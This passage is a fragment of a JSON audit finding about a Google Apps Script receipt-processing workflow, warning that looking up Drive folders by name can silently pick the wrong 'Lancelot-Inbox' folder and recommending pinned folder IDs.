+  "scenario": "DriveApp.getFoldersByName returns the first match anywhere in the account and creates a new folder at the Drive root when there is none. Two folders named Lancelot-Inbox — one shared in, one Aldi made, or one trashed and recreated — and the script can end up scanning the folder Claude does not write to. Every nota then waits in a folder nothing reads, indefinitely, while cekInbox reports success with zero files. The same applies to Lancelot-Selesai: processed JSONs can be moved into a trashed folder at line 473.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "rendah",
+  "fix": "Pin folder IDs in constants beside SPREADSHEET_ID at line 21 and use DriveApp.getFolderById, the way the spreadsheet is already pinned.",
+  "_lens": "v2:062268a017459ac4e7733bf034421031004ec64caf134721d68b022238bd3ade"
+ }
+]
